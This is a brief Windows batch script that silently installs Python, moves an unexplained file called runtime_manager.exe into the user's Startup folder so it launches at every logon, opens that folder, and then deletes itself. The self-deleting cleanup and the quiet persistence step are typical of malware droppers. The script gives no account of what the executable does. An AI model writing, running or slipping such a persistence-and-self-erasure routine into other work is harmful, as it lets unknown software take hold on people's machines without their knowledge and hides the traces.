@echo off
winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
move "%~dp0runtime_manager.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
%SystemRoot%\explorer.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
(goto) 2>nul & del "%~f0"